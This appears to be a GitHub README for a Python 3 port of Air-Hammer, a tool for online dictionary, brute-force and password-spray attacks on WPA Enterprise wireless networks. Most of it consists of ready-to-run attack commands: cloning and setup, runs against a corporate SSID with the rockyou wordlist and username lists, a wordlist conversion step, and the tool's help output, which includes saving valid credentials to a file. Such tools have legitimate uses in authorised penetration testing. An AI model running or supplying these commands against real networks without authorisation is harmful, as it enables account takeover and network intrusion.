Air-Hammer (Python3 version) - A WPA Enterprise horizontal brute-force attack tool
==========

This tool was originally developed by **Wh1t3Rh1n0** and all credit goes to him. The original is available [HERE](https://github.com/Wh1t3Rh1n0/air-hammer).



Usage
-----

 ```bash
git clone https://github.com/player23-0/air-hammer.git
cd air-hammer
python3 -m venv ~/myenv
source ~/myenv/bin/activate
pip install wpa_supplicant
 ```
**Password Bruteforce**:
```bash
echo 'CONTOSO\\test' > test.user
sudo /home/kali/myenv/bin/python air-hammer.py -i wlan3 -e wifi-corp -p /usr/share/wordlists/rockyou-utf8.txt -u test.user
```

**Username Bruteforce/ Password Spray**:
```bash
sudo /home/kali/myenv/bin/python air-hammer.py -i wlan3 -e wifi-corp -P 12345678 -u top-usernames-shortlist.txt
```
Things to note:
- Make sure to use the full path to the Python executable within the virtual environment: /home/kali/myenv/bin/python
- It might not accept the standard rockyou.txt, convert rockyou.txt to utf8:
  ```bash
  iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
  ```



The `-h` or `--help` flags can be used to display Air-Hammer's usage instructions.

```
root@kali:~# ./air-hammer.py --help
usage: air-hammer.py -i interface -e SSID -u USERFILE [-P PASSWORD]
                     [-p PASSFILE] [-s line] [-w OUTFILE] [-1] [-t seconds]

Perform an online, horizontal dictionary attack against a WPA Enterprise
network.

optional arguments:
  -i interface  Wireless interface (default: None)
  -e SSID       SSID of the target network (default: None)
  -u USERFILE   Username wordlist (default: None)
  -P PASSWORD   Password to try on each username (default: None)
  -p PASSFILE   List of passwords to try for each username (default: None)
  -s line       Optional start line to resume attack. May not be used with a
                password list. (default: 0)
  -w OUTFILE    Save valid credentials to a CSV file (default: None)
  -1            Stop after the first set of valid credentials are found
                (default: False)
  -t seconds    Seconds to sleep between each connection attempt (default:
                0.5)
```

